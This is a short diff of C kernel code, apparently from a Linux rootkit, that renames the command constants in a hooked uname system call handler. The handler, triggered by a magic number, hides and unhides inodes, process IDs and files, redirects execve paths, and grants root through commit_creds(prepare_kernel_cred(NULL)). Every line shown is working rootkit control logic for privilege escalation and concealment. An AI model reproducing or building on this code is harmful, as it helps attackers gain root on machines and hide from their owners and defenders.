@@ -544,32 +544,32 @@ asmlinkage long new_sys_newuname(struct new_utsname *name)
 	pr_debug("%s: magic number reveived\n", __func__);
 
 	switch (args.mode) {
-	case HIDE_INODE:
+	case SYSCALL_HIDE_INODE:
 		hide_inode(args.param1);
 		break;
-	case UNHIDE_INODE:
+	case SYSCALL_UNHIDE_INODE:
 		unhide_inode(args.param1);
 		break;
 	case GET_ROOT:
 		commit_creds(prepare_kernel_cred(NULL));
 		break;
-	case HIDE_PID:
+	case SYSCALL_HIDE_PID:
 		hide_pid(args.param1);
 		break;
-	case UNHIDE_PID:
+	case SYSCALL_UNHIDE_PID:
 		unhide_pid(args.param1);
 		break;
-	case HIDE_FILE:
+	case VFS_HIDE_FILE:
 		vfs_hide_filename(args.p_param1, args.param2);
 		break;
-	case UNHIDE_FILE:
+	case VFS_UNHIDE_FILE:
 		vfs_unhide_filename(args.p_param1, args.param2);
 		break;
-	case REDIRECT_EXECVE:
+	case SYSCALL_REDIRECT_EXECVE:
 		redirect_path(args.p_param1, args.param2,
 				args.p_param3, args.param4, REDIRECT_PATH_EXECVE);
 		break;
-	case UNREDIRECT_EXECVE:
+	case SYSCALL_UNREDIRECT_EXECVE:
 		unredirect_path(args.p_param1, args.param2, REDIRECT_PATH_EXECVE);
 		break;
 #ifdef DEBUG
